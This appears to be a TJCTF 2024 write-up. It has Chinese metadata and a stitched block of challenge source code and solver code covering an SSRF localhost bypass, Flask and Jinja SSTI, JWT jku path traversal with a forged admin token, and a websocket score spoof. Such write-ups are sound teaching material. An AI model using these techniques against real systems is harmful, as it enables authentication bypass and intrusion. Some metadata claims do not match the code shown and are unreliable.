---
title: TJCTF 2024 Writeups
contest: TJCTF
year: 2024
difficulty: medium
vuln_type: web_unknown
tags:
- ssrf-localhost
- jwt-jku
- file-upload
- jinja-ssti
- race-condition
- websocket-spoof
attack_chain:
- '1.monitor: 路由 /secret-frogger-78570618/ 拿到提示'
- app.route("/monitor") 检查 request.remote_addr in ('localhost', '127.0.0.1')
- '2. 路由 /flag: req.ip !== ''::ffff:127.0.0.1'' && req.ip !== ''::1'' && req.ip !== ''127.0.0.1'' 校验'
- /fetch 路由：URL 校验 https?:// 但 host.includes('localhost') 拒
- 但用 0.0.0.0 / 127.0.0.1 IP 形式 bypass
- 3. jinja SSTI：add_template_key 设 key=value 改 template_keys 字典
- /template POST 模板字符串 → re 匹配 {{key}} → 替换
- flag 字符串禁止 (403)，但 ssti 可以从 class chain 拿
- 4. JWT jku：verify_token 读 header.jku 路径 static/{jku}
- 路径穿越 static/../uploads/<uuid>/<file>
- 上传 jwk 格式公钥 + 生成 EC 私钥签名 token
- '5. playlist: render_template_string username 拼到 playlist.html'
- 文件名 uuid 写盘 → /view_playlist/<uuid>.html 触发 SSTI
- '6. Kaboom websocket: 抢答类游戏 send_time >= time 检查绕过'
- i==0 时 edit_score(0) 重置; 然后用 user2/user1 交替得 1000 分
key_payload: 'jwt.encode + jku=''../uploads/<uuid>/<file>''  # 路径穿越 jku'
one_liner: TJCTF 2024 多类 (Web/Reverse/Forensics)：JWT jku 路径穿越 + Flask SSTI + WebSocket 抢答。
lesson: JWT jku 字段直接拼到文件系统路径时，../ 序列允许加载攻击者控制的公钥 → 签名伪造。
quality: high
full_path: TJCTF_2024_Writeups.full.md
meta_path: TJCTF_2024_Writeups.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: 'TJCTF 2024 Writeups。TJCTF 2024 多类 (Web/Reverse/Forensics)：JWT jku 路径穿越 + Flask SSTI + WebSocket 抢答。。关键路径：1.monitor: 路由 /secret-frogger-78570618/ 拿到提示 → app.route("/monitor") 检查 request.remote_add...'
category: web
subcategory: web_other
tools_used:
- Flask
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/182723.html
reasoning_chain:
- monitor 路由检查 request.remote_addr in ('localhost','127.0.0.1') → 触发点：SSRF bypass 限本地
- 假设：/fetch 路由 URL 白名单 → 动作：测试 https?:// + host.includes('localhost') 过滤
- 观察：0.0.0.0 / 127.0.0.1 直 IP bypass 字符串包含检查 → 假设：直接换 IP 即可
- JWT jku 字段读 static/{jku} 路径 → 假设：../ 路径穿越到 uploads/ → 动作：上传 jwk 公钥文件 + 设置 jku='../uploads/<uuid>/<file>'
- 观察：服务器加载攻击者公钥 → 用 EC 私钥签 token → 签名通过 → 假设：伪造 admin 身份
- render_template_string 直接拼 username → 假设：username 是 Jinja2 模板 → 动作：设置 username={{config.SECRET_KEY}} 拿密钥
failed_attempts:
- 试图设 username={{7*7}} → 失败：flag 字符串禁止 (403 拦截)
- 试图用 localhost 字符串 → 失败：host.includes('localhost') 黑名单
key_observations:
- JWT jku 是 X.509 公钥 URL 字段，未过滤 ../ 时可加载攻击者公钥
- Flask render_template_string 拼用户输入是经典 SSTI 入口
- SSRF IP 直写（0.0.0.0 / 127.0.0.1）能绕过 host 字符串白名单
prerequisites:
- Flask SSTI 原理（render_template_string vs render_template）
- JWT 字段（jku / x5u / kid）安全风险
- SSRF IP 直写与 host 校验绕过
---
# TJCTF 2024 Writeups

> 原文: https://www.ctfiot.com/182723.html
> ID: 182723


```
User-agent: *
Disallow: /secret-frogger-78570618/
@app.route("/monitor")
def monitor():
 if request.remote_addr in ("localhost", "127.0.0.1"):
 return render_template(
 "admin.html", message=flag, errors="".join(log) or "No recent errors"
 )
 else:
 return render_template("admin.html", message="Unauthorized access", errors="")
app.get('/flag', (req, res) => {
 if (req.ip !== '::
ffff:
127.0.0.1' && req.ip !== '::1' && req.ip !== '127.0.0.1')
 return res.send('bad ip');

 res.send(`hey myself! here's your flag: ${flag}`);
});
app.post('/fetch', async (req, res) => {
 const url = req.body.url;

 if (!/^https?:\/\//.test(url))
 return res.send('invalid url');

 try {
 const checkURL = new URL(url);

 if (checkURL.host.includes('localhost') || checkURL.host.includes('127.0.0.1'))
 return res.send('invalid url');
 } catch (e) {
 return res.send('invalid url');
 }

 const r = await fetch(url, { redirect: 'manual' });

 const fetched = await r.text();

 res.send(fetched);
});
from flask import Flask, request, redirect
import re

app = Flask(__name__)

flag = open('flag.txt').read().strip()

template_keys = {
 'flag': flag,
 'title': 'my website',
 'content': 'Hello, {{name}}!',
 'name': 'player'
}

index_page = open('index.html').read()

@app.route('/')
def index_route():
 return index_page

@app.route('/add', methods=['POST'])
def add_template_key():
 key = request.form['key']
 value = request.form['value']
 template_keys[key] = value
 return redirect('/?msg=Key+added!')

@app.route('/template', methods=['POST'])
def template_route():
 s = request.form['template']

 s = template(s)

 if flag in s[0]:
 return 'No flag for you!', 403
 else:
 return s

def template(s):
 while True:
 m = re.match(r'.*({{.+?}}).*', s, re.DOTALL)
 if not m:
 break

 key = m.group(1)[2:-2]

 if key not in template_keys:
 return f'Key {key} not found!', 500

 s = s.replace(m.group(1), str(template_keys[key]))

 return s, 200

if __name__ == '__main__':
 app.run(port=5000)
if key not in template_keys:
 return f'Key {key} not found!', 500
@app.route("/create_playlist", methods=["POST"])
def post_playlist():
 …
 username = request.form["username"]
 …
 filled = render_template("playlist.html", username=username, songs=text)
 this_id = str(uuid.uuid4())
 with open(f"templates/uploads/{this_id}.html", "w") as f:
 f.write(filled)
 …

@app.route("/view_playlist/")
def view_playlist(name):
 name = str(name)
 …
 return render_template(f"uploads/{name}.html")
 …
ORDER #0001 for <Config {'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'SECRET_KEY': None, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>
@app.route("/flag")
@login_required()
def get_flag(user):
 if user["id"] == "admin":
 return flag
 else:
 return "admins only! shoo!"
def verify_token(token):
 try:
 header = jwt.get_unverified_header(token)
 jku = header["jku"]
 with open(f"static/{jku}", "r") as f:
 keys = json.load(f)["keys"]
 kid = header["kid"]
 for key in keys:
 if key["kid"] == kid:
 public_key = jwt.algorithms.ECAlgorithm.from_jwk(key)
 payload = jwt.decode(token.encode(), public_key, algorithms=["ES256"])
 return payload
 
except Exception:
 pass
 return None
@app.route("/upload", methods=["POST"])
@login_required()
def post_upload(user):
 if "file" not in request.files:
 return redirect(request.url + "?err=No+file+provided")
 file = request.files["file"]
 if file.filename == "":
 return redirect("/?err=Attached+file+has+no+name")
 if file:
 uid = user["id"]
 fid = str(uuid.uuid4())
 folder = os.path.join(os.getcwd(), f"uploads/{uid}")
 os.makedirs(folder, exist_ok=True)
 file.save(os.path.join(folder, fid))
 f = File(fid, file.filename, file.mimetype)
 if uid not in user_files:
 user_files[uid] = {}
 user_files[uid][fid] = f
 return redirect(f"/?success=Successfully+uploaded+file&path={uid}/{fid}")
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import serialization
from jwcrypto import jwk

# EC鍵ペアを生成
private_key = ec.generate_private_key(ec.SECP256R1())

# 秘密鍵をPEM形式でシリアライズ
private_pem = private_key.private_bytes(
 encoding=serialization.Encoding.PEM,
 format=serialization.PrivateFormat.TraditionalOpenSSL,
 encryption_algorithm=serialization.NoEncryption()
)
with open("ec_private_key.pem", "w") as private_file:
 private_file.write(private_pem.decode())

# 公開鍵をPEM形式でシリアライズ
public_key = private_key.public_key()
public_pem = public_key.public_bytes(
 encoding=serialization.Encoding.PEM,
 format=serialization.PublicFormat.SubjectPublicKeyInfo
)

# JWK形式に変換
jwk_public = jwk.JWK.from_pem(public_pem)

# JWK形式の鍵をファイルに保存
with open("ec_public_key.jwk", "w") as public_file:
 public_file.write(jwk_public.export())

print("鍵ペアをJWK形式でファイルに保存しました。")
{
 "keys": [
 <<< ここにec_public_key.jwk >>>
 ]
}
header
{
 "alg": "ES256",
 "jku": "../uploads/0d251448-ac71-4a1d-b702-136b1f2ad17d/bda5c410-5232-445f-8c1a-ff3a4b88a0ea", ← upload先
 "kid": "3mSwZOST2mdZvksPveW0VVzIkq0C0sEHwlxC3OhR4LE", ← 生成したキーペアのkid
 "typ": "JWT"
}

payload
{
 "id": "admin"
}
GET /flag HTTP/2
Host: topplecontainer.tjc.tf
Cookie: token=eyJhbGciOiJFUzI1NiIsImprdSI6Ii4uL3VwbG9hZHMvMGQyNTE0NDgtYWM3MS00YTFkLWI3MDItMTM2YjFmMmFkMTdkL2JkYTVjNDEwLTUyMzItNDQ1Zi04YzFhLWZmM2E0Yjg4YTBlYSIsImtpZCI6IjNtU3daT1NUMm1kWnZrc1B2ZVcwVlZ6SWtxMEMwc0VId2x4QzNPaFI0TEUiLCJ0eXAiOiJKV1QifQ.eyJpZCI6ImFkbWluIn0._k6T_FenUSRVYQ2g4Fu0lBUo8sNZXOtwtPRQdLTtKcjtu9Ye-89qxcZSAAW3Lkm9u1fMDkecCGoLDSBE6HLurQ
@sock.route('/room/<room_id>')
def room_sock(sock, room_id):
 sock.send(b64encode(kahoot['name'].encode()))
 scores = get_room_scores(room_id)
 for i, q in enumerate(kahoot['questions']):
 sock.send(b64encode(json.dumps({
 'send_time': time(),
 'scores': scores,
 **q,
 }).encode()))

 data = sock.receive()
 data = json.loads(b64decode(data).decode())

 send_time = data['send_time']
 recv_time = time()

 if (scores := get_room_scores(room_id)) is not None and send_time >= time():
 sock.send(b64encode(json.dumps({
 'scores': scores,
 'end': True,
 'message': '???'
 }).encode()))
 return

 if i == 0:
 edit_score(scores, room_id, data['id'], 0)

 if data['answer'] == q['answer']:
 edit_score(scores,
 room_id,
 data['id'],
 get_score(scores, room_id, data['id']) + 1000 + max((send_time - recv_time) * 50, -500))

 sock.send(b64encode(json.dumps({
 'scores': scores,
 'end': True,
 'message': f'omg congrats, swiftie!!! {flag}' if get_score(scores, room_id, data['id']) >= 1000 * len(kahoot['questions']) else 'sucks to suck brooooooooo'
 }).encode()))
{"send_time": 1716177131.8692849, "scores": [], "question": "what is the best taylor swift song?", "answers": ["cruel summer", "daylight (stosp's version)", "all too well (10 minute version)", "all too well (5 minute version)"], "answer": 1}
{"id":"cfa6030d-6c73-c262-b872-b37e2c045dd3","answer":0,"send_time":
1716177131.8692849}
if i == 0:
 edit_score(scores, room_id, data['id'], 0)
def edit_score(scores, room_id, uid, new_score):
 for i, score_data in enumerate(scores):
 if score_data[1] == uid:
 scores[i][2] = new_score
 return scores

 all_scores.append([room_id, uid, new_score])
 scores.append(all_scores[-1])
 return scores

def get_score(scores, room_id, uid):
 for score_data in scores:
 if score_data[0] == room_id and score_data[1] == uid:
 return score_data[2]

 return 0

…

edit_score(scores,
 room_id,
 data['id'],
 get_score(scores, room_id, data['id']) + 1000 + max((send_time - recv_time) * 50, -500))
import asyncio, websockets, binascii, random, string, json
from base64 import b64decode, b64encode

async def solve():
 #uri = "ws://localhost:
4444"
 uri = 'wss://kaboot-b7598a0831b4faf3.tjc.tf'
 room_id = "".join(random.choices(string.ascii_letters, k=8))

 for _ in range(2):
 async with websockets.connect(uri + '/room/' + room_id) as websocket:
 resp = await websocket.recv()

 for i in range(10):
 resp = await websocket.recv()
 resp = json.loads(b64decode(resp).decode())

 print(resp)

 if 'end' in resp:
 break

 await websocket.send(b64encode(json.dumps({
 'id': 'user2' if i == 0 else 'user1',
 'answer': resp['answer'],
 'send_time': resp['send_time'],
 }).encode()))

 resp = await websocket.recv()
 resp = json.loads(b64decode(resp).decode())

 print(resp)

asyncio.get_event_loop().run_until_complete(solve())
```
